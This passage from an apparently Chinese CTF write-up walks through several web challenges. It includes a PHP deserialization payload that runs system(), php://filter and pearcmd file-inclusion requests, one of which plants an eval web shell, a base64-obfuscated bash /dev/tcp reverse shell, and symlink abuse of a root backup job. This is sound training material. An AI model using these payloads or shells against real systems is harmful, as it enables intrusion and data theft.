<pre tabindex="0"><code>O%3A6%3A%22GOGOGO%22%3A1%3A%7Bs%3A8%3A%22dengchao%22%3BO%3A6%3A%22DouBao%22%3A3%3A%7Bs%3A3%3A%22dao%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A8%3A%22HeiCaFei%22%3A1%3A%7Bs%3A9%3A%22HongCaFei%22%3Bs%3A6%3A%22system%22%3B%7Di%3A1%3Bs%3A23%3A%22cat+%2Fofl1111111111ove4g%22%3B%7Ds%3A9%3A%22Dagongren%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A6%3A%22xrntkk%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A1%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A42%3A%22D%3A%5Cphpstudy_pro%5CWWW%5CtempCodeRunnerFile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A22%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7Ds%3A9%3A%22Bagongren%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A6%3A%22xrntkk%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A2%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A42%3A%22D%3A%5Cphpstudy_pro%5CWWW%5CtempCodeRunnerFile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A22%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D%7D%7D
</code></pre><p>还需要绕过</p>
<pre tabindex="0"><code>throw new Exception(&#39;What do you want to do?&#39;);
</code></pre><p>在最后一个括号前面加上<code>;1</code>即可</p>
<p>最终payload</p>
<pre tabindex="0"><code>O%3A6%3A%22GOGOGO%22%3A1%3A%7Bs%3A8%3A%22dengchao%22%3BO%3A6%3A%22DouBao%22%3A3%3A%7Bs%3A3%3A%22dao%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A8%3A%22HeiCaFei%22%3A1%3A%7Bs%3A9%3A%22HongCaFei%22%3Bs%3A6%3A%22system%22%3B%7Di%3A1%3Bs%3A23%3A%22cat+%2Fofl1111111111ove4g%22%3B%7Ds%3A9%3A%22Dagongren%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A6%3A%22xrntkk%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A1%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A42%3A%22D%3A%5Cphpstudy_pro%5CWWW%5CtempCodeRunnerFile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A22%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7Ds%3A9%3A%22Bagongren%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A6%3A%22xrntkk%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A2%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A42%3A%22D%3A%5Cphpstudy_pro%5CWWW%5CtempCodeRunnerFile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A22%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D%7D;1%7D
</code></pre><p><img alt="image-20250608210703322" loading="lazy" src="../assets/image-20250608210703322.png"></p>
<h3 id="deceptiflag">DeceptiFlag<a hidden class="anchor" aria-hidden="true" href="#deceptiflag">#</a></h3>
<p>先对个脑洞</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nf">POST</span> <span class="nn">/?qaq=xiyangyang</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">27.25.151.198:38605</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">Cache-Control</span><span class="o">:</span> <span class="l">max-age=0</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">http://27.25.151.198:38605/</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">PHPSESSID=d75f67cbc118fd9eb75b84c0c91cd7fd; pahint=L3Zhci9mbGFnL2ZsYWcudHh0</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="n">Origin</span><span class="o">:</span> <span class="l">http://27.25.151.198:38605</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.9</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">28</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl">qaq_visible=xiyangyang&amp;Lang=huitailang
</span></span></code></pre></div><p>接着看到可以文件包含，但是会在后面拼接上.php</p>
<p>伪协议直接读</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nf">POST</span> <span class="nn">/tips.php?file=php://filter/resource=/var/flag/flag.txt</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">27.25.151.198:38605</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">Cache-Control</span><span class="o">:</span> <span class="l">max-age=0</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">http://27.25.151.198:38605/</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">PHPSESSID=d75f67cbc118fd9eb75b84c0c91cd7fd; pahint=L3Zhci9mbGFnL2ZsYWcudHh0</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="n">Origin</span><span class="o">:</span> <span class="l">http://27.25.151.198:38605</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.9</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">28</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl">qaq_visible=xiyangyang&amp;Lang=huitailang
</span></span></code></pre></div><p><img alt="image-20250608181820237" loading="lazy" src="../assets/image-20250608181820237.png"></p>
<p>这题也可以打pearcmd，狠狠上马</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nf">POST</span> <span class="nn">/tips.php?+config-create+/&amp;file=file:///usr/local/lib/php/pearcmd&amp;/&lt;?=eval($_POST[1])?&gt;+1.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">27.25.151.198:49096</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">PHPSESSID=354fc88851eeee8113a2f34aa8b997d1; pahint=L3Zhci9mbGFnL2ZsYWcudHh0</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.9</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">http://27.25.151.198:49096/</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="n">Origin</span><span class="o">:</span> <span class="l">http://27.25.151.198:49096</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="n">Cache-Control</span><span class="o">:</span> <span class="l">max-age=0</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">28</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl">qaq_visible=xiyangyang&amp;Lang=huitailang
</span></span></code></pre></div><h3 id="webrejust-ping-part-1">[WEB+RE]Just Ping Part 1<a hidden class="anchor" aria-hidden="true" href="#webrejust-ping-part-1">#</a></h3>
<p>GO的逆向</p>
<p>ida打开可以看到两个路由/api/ping和/api/testDevelopApi</p>
<p><img alt="image-20250608182237347" loading="lazy" src="../assets/image-20250608182237347.png"></p>
<p>跟进off_72CBA8函数后跟进moran_goweb1_handle_DevelopmentHandler</p>
<p><img alt="image-20250608182412120" loading="lazy" src="../assets/image-20250608182412120.png"></p>
<p>看不懂，直接扔给gpt分析</p>
<p>/api/testDevelopApi路由代码逻辑大致如下（不会逆向，大概看看</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kd">func</span> <span class="nf">DevelopmentHandler</span><span class="p">(</span><span class="nx">w</span> <span class="nx">http</span><span class="p">.</span><span class="nx">ResponseWriter</span><span class="p">,</span> <span class="nx">r</span> <span class="o">*</span><span class="nx">http</span><span class="p">.</span><span class="nx">Request</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">    <span class="nx">query</span> <span class="o">:=</span> <span class="nx">r</span><span class="p">.</span><span class="nx">URL</span><span class="p">.</span><span class="nf">Query</span><span class="p">()</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">    <span class="nx">cmdStr</span> <span class="o">:=</span> <span class="nx">query</span><span class="p">.</span><span class="nf">Get</span><span class="p">(</span><span class="s">&#34;cmd&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="k">if</span> <span class="nx">cmdStr</span> <span class="o">==</span> <span class="s">&#34;&#34;</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">        <span class="nx">http</span><span class="p">.</span><span class="nf">Error</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="s">&#34;cmd cant be null&#34;</span><span class="p">,</span> <span class="mi">400</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">        <span class="k">return</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="c1">// 从对象池取命令字符串对象</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nx">poolObj</span> <span class="o">:=</span> <span class="nx">commandStringPool</span><span class="p">.</span><span class="nf">Get</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="c1">// 用 shlex 解析命令字符串</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="nx">args</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">shlex</span><span class="p">.</span><span class="nf">Split</span><span class="p">(</span><span class="nx">cmdStr</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="c1">// 解析失败时，显式回收</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nx">commandStringPool</span><span class="p">.</span><span class="nf">Put</span><span class="p">(</span><span class="nx">poolObj</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="nx">http</span><span class="p">.</span><span class="nf">Error</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="s">&#34;server error&#34;</span><span class="p">,</span> <span class="mi">400</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">return</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="c1">// 执行命令</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="nx">output</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">exec</span><span class="p">.</span><span class="nf">Command</span><span class="p">(</span><span class="nx">args</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nx">args</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span><span class="o">...</span><span class="p">).</span><span class="nf">CombinedOutput</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="c1">// 执行失败时，显式回收</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="nx">commandStringPool</span><span class="p">.</span><span class="nf">Put</span><span class="p">(</span><span class="nx">poolObj</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="nx">http</span><span class="p">.</span><span class="nf">Error</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="s">&#34;command error&#34;</span><span class="p">,</span> <span class="mi">400</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="k">return</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">
</span></span><span class="line"><span class="ln">30</span><span class="cl">    <span class="c1">// 写响应</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">    <span class="nx">_</span><span class="p">,</span> <span class="nx">err</span> <span class="p">=</span> <span class="nx">w</span><span class="p">.</span><span class="nf">Write</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="s">&#34;Command executed successfully.\n&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">    <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">        <span class="c1">// 响应写失败时，显式回收</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">        <span class="nx">commandStringPool</span><span class="p">.</span><span class="nf">Put</span><span class="p">(</span><span class="nx">poolObj</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">        <span class="nx">http</span><span class="p">.</span><span class="nf">Error</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="s">&#34;write error&#34;</span><span class="p">,</span> <span class="mi">500</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">        <span class="k">return</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">
</span></span><span class="line"><span class="ln">39</span><span class="cl">    <span class="c1">// 命令执行完毕且响应写完，显式回收对象池资源</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">    <span class="nx">commandStringPool</span><span class="p">.</span><span class="nf">Put</span><span class="p">(</span><span class="nx">poolObj</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>shlex.Split库会将传入的命令按照空格分割成数组，并传入exec.Command，但是没有回显</p>
<p>/api/ping路由实在看不懂了，就没看</p>
<p>直接看web端，无疑中发现</p>
<p><img alt="image-20250608190600910" loading="lazy" src="../assets/image-20250608190600910.png"></p>
<p>我测这怎么回事</p>
<p>经过测试可以发现，当在/api/testDevelopApi传入时</p>
<pre tabindex="0"><code>echo 555 555 555
</code></pre><p>在/api/ping中传入ip会出现如下的情况</p>
<p><img alt="image-20250608190844691" loading="lazy" src="../assets/image-20250608190844691.png"></p>
<p>大概可以理解为/api/ping和/api/testDevelopApi共用一个对象池Pool，我们在/api/testDevelopApi中执行命令后在/api/ping处发生了资源的复用</p>
<p>跟进/api/ping的回显，我们可以猜到这里执行的命令应该是</p>
<pre tabindex="0"><code>ping -c 4 127.0.0.1
</code></pre><p>猜测正常情况下/api/ping会从连接池中获取模板<code>ping -c 4 ip</code>并将最后一个参数替换为传入的IP，当我们在/api/testDevelopApi传入<code>echo 555 555 555</code>时，被/api/ping获取了，并拼接为<code>echo 555 555 127.0.0.1</code>执行。</p>
<p>所以我们可以构造出Payload:</p>
<pre tabindex="0"><code>/api/testDevelopApi?cmd=cat /flag 555
</code></pre><p><img alt="image-20250608191954605" loading="lazy" src="../assets/image-20250608191954605.png"></p>
<p>拿到flag</p>
<h3 id="webrejust-ping-part-2">[WEB+RE]Just Ping Part 2<a hidden class="anchor" aria-hidden="true" href="#webrejust-ping-part-2">#</a></h3>
<p>这题跟上一题的web部分完全相同，但是为了方便，这题我直接弹shell了</p>
<p>Payload:</p>
<pre tabindex="0"><code>bash+-c+echo%24%7bIFS%7d%22YmFzaCAtaSA%2bJiAvZGV2L3RjcC9pcC9wb3J0IDA%2bJjE%3d%22%24%7bIFS%7d%7c%24%7bIFS%7dbase64%24%7bIFS%7d-d%24%7bIFS%7d%7c%24%7bIFS%7dbash+123
</code></pre><p>题目中给了个附件</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="cp">#!/bin/bash
</span></span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="k">if</span> <span class="o">[</span> ! -f <span class="s2">&#34;backup&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="nb">exit</span> <span class="m">1</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="nv">ACTUAL_MD5</span><span class="o">=</span><span class="k">$(</span>md5sum <span class="s2">&#34;backup&#34;</span> <span class="p">|</span> cut -d<span class="s1">&#39; &#39;</span> -f1<span class="k">)</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="k">if</span> <span class="o">[</span> <span class="s2">&#34;</span><span class="nv">$ACTUAL_MD5</span><span class="s2">&#34;</span> <span class="o">=</span> <span class="s2">&#34;18ed919aada0f7adca8802acf7b8a4d5&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    backup
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="k">else</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="nb">exit</span> <span class="m">1</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">fi</span>
</span></span></code></pre></div><p>里面提到了一个backup文件</p>
<p>可以找到文件的路径</p>
<pre tabindex="0"><code>/usr/local/etc/backup
</code></pre><p>web目录没有读写权限，我们可以base64编码后提取backup</p>
<p>对backup进行逆向分析</p>
<p><img alt="image-20250608220609527" loading="lazy" src="../assets/image-20250608220609527.png"></p>
<p>Strings爆搜能找到两个路径，我们先来看backupList</p>
<p><img alt="image-20250608220932554" loading="lazy" src="../assets/image-20250608220932554.png"></p>
<p>这里有一个/root/healthy</p>
<p>接着看/var/backups/backup.zip，我们依旧base64后提取出来</p>
<p><img alt="image-20250608221145124" loading="lazy" src="../assets/image-20250608221145124.png"></p>
<p><img alt="image-20250608221249266" loading="lazy" src="../assets/image-20250608221249266.png"></p>
<p>发现这里面应该就是刚刚backupList里面/root/healthy文件夹</p>
<p>也就是说backup会定时把backupList中的目录备份到/var/backups/目录</p>
<p>我们现在目标就是要想办法利用backup将/root目录打包，这样我们就可以拿到flag</p>
<p>但是由于我们没有backupList的读写权限，我们需要使用一些骚操作</p>
<p>Payload</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln"> 1</span><span class="cl">enjoy@hnctf-3b9e2ebaebdc4eb9:/usr/local/etc$ mkdir bak 
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">mkdir bak
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">enjoy@hnctf-3b9e2ebaebdc4eb9:/usr/local/etc$ mv backup bak/123
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">mv backup bak/123
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">enjoy@hnctf-3b9e2ebaebdc4eb9:/usr/local/etc$ ln -s bak/123 backup 
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">ln -s bak/123 backup
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">//利用软连接来保证backup能被正常检验和执行
</span></span><span class="line"><span class="ln">10</span><span class="cl">
</span></span><span class="line"><span class="ln">11</span><span class="cl">enjoy@hnctf-3b9e2ebaebdc4eb9:/usr/local/etc$ <span class="nb">echo</span> <span class="s2">&#34;/root&#34;</span>&gt;backupList
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;/root&#34;</span>&gt;backupList
</span></span><span class="line"><span class="ln">13</span><span class="cl">//backupList需要在backup的上级目录
</span></span></code></pre></div><p><img alt="image-20250608222525162" loading="lazy" src="../assets/image-20250608222525162.png"></p>
<p>提取backup.zip</p>
<p><img alt="image-20250608222628705" loading="lazy" src="../assets/image-20250608222628705.png"></p>
<p>拿到flag</p>
<h3 id="奇怪的咖啡店">奇怪的咖啡店<a hidden class="anchor" aria-hidden="true" href="#奇怪的咖啡店">#</a></h3>
<p>题目给出了部分源码</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">  1</span><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template_string</span><span class="p">,</span> <span class="n">render_template</span>
</span></span><span class="line"><span class="ln">  2</span><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="ln">  3</span><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="ln">  4</span><span class="cl">
</span></span><span class="line"><span class="ln">  5</span><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">  6</span><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;SECRET_KEY&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">  7</span><span class="cl">
</span></span><span class="line"><span class="ln">  8</span><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="ln">  9</span><span class="cl"><span class="k">def</span> <span class="nf">store</span><span class="p">():</span>
</span></span><span class="line"><span class="ln"> 10</span><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 11</span><span class="cl">        <span class="n">session</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s2">&#34;customer&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 12</span><span class="cl">        <span class="n">session</span><span class="p">[</span><span class="s1">&#39;permission&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 13</span><span class="cl">
</span></span><span class="line"><span class="ln"> 14</span><span class="cl">    <span class="n">error_message</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="ln"> 15</span><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 16</span><span class="cl">        <span class="n">error_message</span> <span class="o">=</span> <span class="s1">&#39;&lt;p style=&#34;color: red; font-size: 0.8em;&#34;&gt;该商品暂时无法购买，请稍后再试！&lt;/p&gt;&#39;</span>
</span></span><span class="line"><span class="ln"> 17</span><span class="cl">
</span></span><span class="line"><span class="ln"> 18</span><span class="cl">    <span class="n">products</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="ln"> 19</span><span class="cl">        <span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;美式咖啡&#34;</span><span class="p">,</span> <span class="s2">&#34;price&#34;</span><span class="p">:</span> <span class="mf">9.99</span><span class="p">,</span> <span class="s2">&#34;image&#34;</span><span class="p">:</span> <span class="s2">&#34;1.png&#34;</span><span class="p">},</span>
